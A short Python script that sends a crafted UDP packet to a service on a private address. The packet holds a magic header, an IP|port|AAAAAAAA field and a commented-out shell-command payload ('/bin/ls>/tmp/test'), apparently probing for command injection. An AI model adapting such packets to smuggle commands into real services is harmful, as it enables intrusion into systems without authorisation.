#!/usr/bin/env python
import socket
from struct import *
import random

UDP_IP = '10.0.0.1'
UDP_PORT = 20007
BUFFER_SIZE = 1024

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((UDP_IP, UDP_PORT))

buf = pack("<I", 1347961165)
#buf = pack("<I", 2280059729)
buf += "10.0.0.1|4551|AAAAAAAA"
#buf += "/bin/ls>/tmp/test" 

print "sending buf: %s" % (buf) 
s.send(buf)
s.close()

